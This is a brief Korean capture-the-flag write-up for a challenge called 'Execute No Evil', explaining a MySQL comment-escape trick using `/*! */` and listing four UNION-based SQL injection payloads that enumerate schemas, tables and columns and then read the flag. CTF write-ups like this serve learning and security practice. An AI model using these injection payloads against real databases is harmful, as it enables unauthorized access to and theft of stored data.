# Execute No Evil
주석 탈출문제. mysql에서 `/*! */` 안의 내용을 실행할 수 있는 점을 이용하여 공격 가능.


```
! 0 union select 1,2,schema_name from information_schema.schemata union select 1,2,
```

```
! 0 union select 1,2,table_name from information_schema.tables where table_schema="ctf" union select 1,2,
```

```
! 0 union select 1,2,column_name from information_schema.columns where table_name="flag" union select 1,2,
```

```
! 0 union select 1,2,whatsthis from flag union select 1,2,
```